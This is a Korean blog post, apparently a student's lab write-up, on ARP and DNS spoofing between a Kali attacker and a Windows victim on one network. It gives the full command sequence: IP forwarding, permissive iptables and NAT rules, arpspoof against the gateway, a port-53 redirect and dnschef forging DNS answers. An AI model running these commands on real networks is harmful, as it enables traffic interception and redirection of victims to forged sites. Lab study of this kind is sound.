---
{"title":"ARP, DNS spoof 실습","date":"2026-11-11","category":"writing","tags":["ARP","DNS","Spoof","해킹"],"summary":"ARP·DNS 스푸핑 실습","section":[]}
---


# [ 보안 문제풀이 ] ARP, DNS spoof 실습

## 개요

ARP란? : Address Resolution Protocol의 약어로, 컴퓨터 네트워크에서 IP 주소를 MAC 주소로 매핑하는 프로토콜이다.

DNS란? : Domain Name Server의 약어로, 도메인 이름을 컴퓨터가 이해할 수 있는 IP 주소로 변환해 주는 시스템이다.

각각 한마디로 정리하자면, ARP는 192.168.10.0 이라는 IP를 FF:FF:FF:FF라는 MAC 주소랑 매핑하는 것이고,

DNS는 naver.com을 223.130.192.248로 매핑하는 것이다.

```bash
ipconfig /all

무선 LAN 어댑터 Wi-Fi:

   연결별 DNS 접미사. . . . :
   설명. . . . . . . . . . . . : -
   물리적 주소 . . . . . . . . : 70-D8-23-95-15-**
   DHCP 사용 . . . . . . . . . : -
   자동 구성 사용. . . . . . . : -
   링크-로컬 IPv6 주소 . . . . : -
   IPv4 주소 . . . . . . . . . : 192.168.45.***(기본 설정)
   서브넷 마스크 . . . . . . . : -
   임대 시작 날짜. . . . . . . : -
   임대 만료 날짜. . . . . . . : -
   기본 게이트웨이 . . . . . . : -
   DHCP 서버 . . . . . . . . . : -
   DHCPv6 IAID . . . . . . . . : -
   DHCPv6 클라이언트 DUID. . . : -
   DNS 서버. . . . . . . . . . : -
                                 -
   Tcpip를 통한 NetBIOS. . . . : -
```

```bash
C:\Users\chanh>ping naver.com

Ping naver.com [223.130.192.248] 32바이트 데이터 사용:
```

뭐 대충 위에 있는 코드블록을 읽어보면 어떻게 확인하는지 알 수 있다.

우선 필자는 공유기 -> 칼리 (공격자) -> 윈도우 (피해자)로 구성했다.

큰 공격의 틀을 보자면 칼리가 공유기인척 윈도우한테 잘못된 DNS IP를 보내어 변조된 사이트에 들어가게 하는 원리이다.

![image01](/assets/uploads/tistory-17-01.png)

엄청난 그림으로 설명을 하자면 녹색이 각 단말기의 "주소"라고 했을 때 Kali 친구가 윈도우 친구한테 1번 주소인척, 즉 공유기인척 접근하는 공격이다. 같은 네트워크에서 게이트웨이를 통해 공격되곤 한다.

그럼 나머진 직접 실습하면서 설명하겠다.

* * *

## 칼리리눅스 설정 (공격자 설정)

우선 패킷 포워딩(라우터 모드)를 활성화 해야한다.

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

ip\_forward=1을 설정해야만 칼리가 "내가 목적지는 아니지만, 다리(Bridge) 역할을 해서 원래 가려던 공유기로 토스해 줄게!" 하고 패킷을 넘겨주어 윈도우의 인터넷을 끊기지 않게 유지(중간자 공격 성립)시킵니다.

두번째는 칼리리눅스 자체 방화벽(iptables) 포워딩 규칙을 초기화 및 허용해야 한다.

```bash
sudo iptables -F FORWARD
sudo iptables -P FORWARD ACCEPT
```

패킷 포워딩을 열었다고 한들 내부 방화벽을 통과하지 못하면 가로막히게 된다.

\- iptables -F FORWARD: 기존에 방화벽에 걸려있던 지저분한 패킷 차단 규칙들을 깨끗하게 청소(Flush)한다.

\- iptables -P FORWARD ACCEPT: "내 컴퓨터를 거쳐 지나가는 모든 외부 패킷을 묻지도 따지지도 말고 통과시켜라"라는 기본 정책(Default Policy)을 수립한다. 이로써 윈도우의 트래픽이 칼리 내부 방화벽에 걸려 드롭되는 현상을 완벽하게 방지한다.

세번째는 무선 LAN환경 우회를 위한 NAT 위장(Masquerade) 설정이다.

```bash
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
```

칼리리눅스를 통과해 외부 인터넷(공유기)으로 나가는 모든 패킷의 출발지 IP주소를 칼리리눅스의 IP 주소로 강제 변환(NAPT, Network Address Port Translation)하게 하는 역할이다.

요즘 공유기나 무선 AP 보안 장비들은 IP-MAC 바인딩 검사를 하는데 "이 패킷을 나한테 던진 랜카드는 칼리인데, 출발지는 왜 윈도우지?"하고 패킷을 드롭하는 것을 방지한다.

칼리 방화벽이 패킷의 출발지 IP를 윈도우IP에서 칼리IP로 바꿔치기해서 내보낸다. 이걸 장부같은 곳에 적어놨다가 나중에 확인해서 반환한다.

* * *

## 공격

우선 윈도우한테 내가 공유기라는 것을 거짓말 해야하니깐 속인다.

```bash
sudo arpspoof -i wlan0/eth0 [불쌍한 윈도우] [게이트웨이]
```

wlan0 / eth0는 이미 이 글을 보는 사람들이라면 다 알겠지만, wireless lan과 ethernet의 준말이다. 현재 인터넷 연결 상황에 맞게 입력하면 된다.

이제 공유기에서 넘어온 DNS(포트번호 : 53)을 캐치하는 명령어이다. 이걸 그대로 공유기에 넘겼다간 올바른 DNS 주소가 올텐데 우리의 목적은 가짜 DNS 주소를 주는 것이다.

```bash
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 53
```

그럼 이제 가짜 DNS 주소를 주는 명령어이다.

```bash
sudo dnschef --fakeip [가짜IP] --fakedomains test.com,*.test.com --interface [칼리IP]
```

* * *

## 정리

네트워크 보안 여러 레이어에 대해 찍먹을 해봤는데 우선 넘 어려운거 같다.

각 계층마다 난관이 있어서 힘들었지만 용어도 많이 알고 어떻게 네트워크가 돌아가는지 알게되는 계기였다.
